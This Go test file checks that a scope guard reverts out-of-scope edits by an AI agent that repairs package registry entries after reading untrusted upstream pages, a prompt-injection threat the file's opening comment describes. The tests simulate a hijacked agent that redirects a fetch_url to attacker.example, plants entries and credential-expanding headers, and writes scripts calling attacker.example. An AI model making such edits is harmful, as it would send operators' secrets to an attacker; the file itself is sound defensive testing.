package autoupdate

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// The registry fixer reads untrusted upstream pages, so a prompt injection can
// steer it. These tests play that steered agent: each edit also repairs the
// failed entry, so the re-check alone would pass, and the scope check is what
// must refuse the edit and restore the directory.

// neighbour is a second, unrelated entry carrying the fields an attacker wants:
// a fetch_url that receives the operator's secrets.
const neighbour = `
["media-video/other"]
url = "https://vendor.example/api"
parser = "json"
path = "version"
meta = { fetch_method = "post", fetch_url = "https://vendor.example/download", fetch_serial_env = "BENTOO_FETCH_OTHER_KEY", fetch_filename = "other-{version}.tar.xz" }
`

func newScopeRegistry(t *testing.T) *s060Registry {
	t.Helper()
	r := newS060Registry(t)
	r.original = append(r.original, []byte(neighbour)...)
	if err := os.WriteFile(r.configPath, r.original, s060RegistryMode); err != nil {
		t.Fatal(err)
	}
	return r
}

// writeRegistry returns a fixer edit that writes body as packages.toml.
func (r *s060Registry) writeRegistry(body string) func(t *testing.T) {
	return func(t *testing.T) {
		t.Helper()
		if err := os.WriteFile(r.configPath, []byte(body), 0o644); err != nil {
			t.Fatalf("fixer edit: %v", err)
		}
	}
}

func assertOutOfScope(t *testing.T, a *RegistryFixAttempt, wantInErr string) {
	t.Helper()
	if a.Status != RegistryFixReverted {
		t.Fatalf("Status = %v, want RegistryFixReverted (Err=%v RecheckErr=%v)", a.Status, a.Err, a.RecheckErr)
	}
	assertStage(t, a, RegistryFixStageScope)
	if !errors.Is(a.Err, ErrRegistryFixOutOfScope) {
		t.Fatalf("Err = %v, want it to wrap ErrRegistryFixOutOfScope", a.Err)
	}
	if !strings.Contains(a.Err.Error(), wantInErr) {
		t.Errorf("Err = %q, want it to name %q", a.Err, wantInErr)
	}
	if a.RestoreErr != nil {
		t.Errorf("RestoreErr = %v, want a clean restore", a.RestoreErr)
	}
	if a.Recheck != nil {
		t.Error("the re-check ran; it must not fetch from a url an out-of-scope edit introduced")
	}
}

func TestRegistryFixScope_RevertsAnEditToAnotherEntry(t *testing.T) {
	r := newScopeRegistry(t)
	hijacked := strings.Replace(neighbour, "https://vendor.example/download", "https://attacker.example/collect", 1)
	f := &s060Fixer{edit: r.writeRegistry(r.entry("version") + hijacked)}

	a := r.attempt(t, f, r.newChecker)

	assertOutOfScope(t, a, `changed entry "media-video/other"`)
	r.assertOnDisk(t, r.original, s060RegistryMode, "an edit to another entry is rolled back")
}

func TestRegistryFixScope_RevertsAnAddedOrRemovedEntry(t *testing.T) {
	t.Run("added", func(t *testing.T) {
		r := newScopeRegistry(t)
		extra := "\n[\"app-misc/planted\"]\nurl = \"https://attacker.example\"\nparser = \"json\"\npath = \"v\"\n"
		a := r.attempt(t, &s060Fixer{edit: r.writeRegistry(r.entry("version") + neighbour + extra)}, r.newChecker)
		assertOutOfScope(t, a, `added entry "app-misc/planted"`)
		r.assertOnDisk(t, r.original, s060RegistryMode, "a planted entry is rolled back")
	})
	t.Run("removed", func(t *testing.T) {
		r := newScopeRegistry(t)
		a := r.attempt(t, &s060Fixer{edit: r.writeRegistry(r.entry("version"))}, r.newChecker)
		assertOutOfScope(t, a, `removed entry "media-video/other"`)
		r.assertOnDisk(t, r.original, s060RegistryMode, "a deleted entry comes back")
	})
}

func TestRegistryFixScope_RevertsACredentialHeaderOnTheEntry(t *testing.T) {
	r := newScopeRegistry(t)
	withHeader := r.entry("version") + "headers = { \"X-Api-Key\" = \"${BENTOO_FETCH_OTHER_KEY}\" }\n" + neighbour

	a := r.attempt(t, &s060Fixer{edit: r.writeRegistry(withHeader)}, r.newChecker)

	assertOutOfScope(t, a, `header "X-Api-Key" with an environment expansion`)
	r.assertOnDisk(t, r.original, s060RegistryMode, "a planted credential header is rolled back")
}

func TestRegistryFixScope_RevertsFilesBesidePackagesToml(t *testing.T) {
	t.Run("new script", func(t *testing.T) {
		r := newScopeRegistry(t)
		planted := filepath.Join(r.configDir, "scripts", "planted.js")
		edit := func(t *testing.T) {
			r.writeRegistry(r.entry("version") + neighbour)(t)
			if err := os.MkdirAll(filepath.Dir(planted), 0o755); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(planted, []byte("fetch('https://attacker.example')"), 0o644); err != nil {
				t.Fatal(err)
			}
		}

		a := r.attempt(t, &s060Fixer{edit: edit}, r.newChecker)

		assertOutOfScope(t, a, filepath.Join("scripts", "planted.js"))
		if _, err := os.Stat(planted); !errors.Is(err, os.ErrNotExist) {
			t.Errorf("the planted script survived the revert (stat err = %v)", err)
		}
		r.assertOnDisk(t, r.original, s060RegistryMode, "packages.toml is rolled back with it")
	})
	t.Run("modified script", func(t *testing.T) {
		r := newScopeRegistry(t)
		script := filepath.Join(r.configDir, "scripts", "kept.js")
		if err := os.MkdirAll(filepath.Dir(script), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(script, []byte("return '1.0';"), 0o644); err != nil {
			t.Fatal(err)
		}
		edit := func(t *testing.T) {
			r.writeRegistry(r.entry("version") + neighbour)(t)
			if err := os.WriteFile(script, []byte("fetch('https://attacker.example')"), 0o644); err != nil {
				t.Fatal(err)
			}
		}

		a := r.attempt(t, &s060Fixer{edit: edit}, r.newChecker)

		assertOutOfScope(t, a, filepath.Join("scripts", "kept.js"))
		if got, _ := os.ReadFile(script); string(got) != "return '1.0';" {
			t.Errorf("scripts/kept.js holds %q after the revert, want the original", got)
		}
	})
}

// TestRegistryFixScope_KeepsAnInScopeEdit: repairing the failed entry while
// only reformatting the rest (a comment, blank lines) is not a violation.
func TestRegistryFixScope_KeepsAnInScopeEdit(t *testing.T) {
	r := newScopeRegistry(t)
	edited := r.entry("version") + "\n# a comment the agent added\n\n" + neighbour

	a := r.attempt(t, &s060Fixer{edit: r.writeRegistry(edited)}, r.newChecker)

	if a.Status != RegistryFixPassed {
		t.Fatalf("Status = %v, want RegistryFixPassed (Err=%v RecheckErr=%v)", a.Status, a.Err, a.RecheckErr)
	}
	r.assertOnDisk(t, []byte(edited), s060RegistryMode, "an in-scope fix is kept")
}

// TestRegistryFixScope_FixerErrorRestoresTheDirectory: a fixer that writes a
// file and then fails is reverted through Revert, which must clean the whole
// directory, not only packages.toml.
func TestRegistryFixScope_FixerErrorRestoresTheDirectory(t *testing.T) {
	r := newScopeRegistry(t)
	planted := filepath.Join(r.configDir, "targets.toml.new")
	edit := func(t *testing.T) {
		if err := os.WriteFile(planted, []byte("x"), 0o644); err != nil {
			t.Fatal(err)
		}
	}

	a := r.attempt(t, &s060Fixer{edit: edit, err: errors.New("agent crashed")}, r.newChecker)

	assertStage(t, a, RegistryFixStageFixer)
	if _, err := os.Stat(planted); !errors.Is(err, os.ErrNotExist) {
		t.Errorf("a file written before the fixer failed survived the revert (stat err = %v)", err)
	}
}

func TestCheckRegistryFixScope(t *testing.T) {
	const pkg = "app-misc/target"
	base := `["app-misc/target"]
url = "https://a.example"
parser = "json"
path = "old"
headers = { "User-Agent" = "bentoo-autoupdate", "Authorization" = "token ${GITHUB_TOKEN}" }
meta = { fetch_url = "https://a.example/dl" }
`
	cases := []struct {
		name    string
		after   string
		wantErr string
	}{
		{"path repaired", strings.Replace(base, `"old"`, `"new"`, 1), ""},
		{"url moved", strings.Replace(base, "https://a.example\"", "https://b.example\"", 1), ""},
		{"unchanged expansion kept", strings.Replace(base, `"old"`, `"new"`, 1), ""},
		{"expansion header changed", strings.Replace(base, "token ${GITHUB_TOKEN}", "token ${BENTOO_X}", 1), `header "Authorization"`},
		{"meta fetch_url changed", strings.Replace(base, "https://a.example/dl", "https://evil.example/dl", 1), "meta"},
		{"meta removed", strings.Replace(base, "meta = { fetch_url = \"https://a.example/dl\" }\n", "", 1), "meta"},
		{"unparseable output is left to the re-check", "[[[", ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			err := checkRegistryFixScope([]byte(base), []byte(tc.after), pkg)
			if tc.wantErr == "" {
				if err != nil {
					t.Fatalf("checkRegistryFixScope = %v, want nil", err)
				}
				return
			}
			if !errors.Is(err, ErrRegistryFixOutOfScope) || !strings.Contains(err.Error(), tc.wantErr) {
				t.Fatalf("checkRegistryFixScope = %v, want ErrRegistryFixOutOfScope naming %q", err, tc.wantErr)
			}
		})
	}
	if err := checkRegistryFixScope([]byte("[[["), []byte(base), pkg); err == nil {
		t.Error("an unparseable pre-fix registry must be an error, not a pass")
	}
}
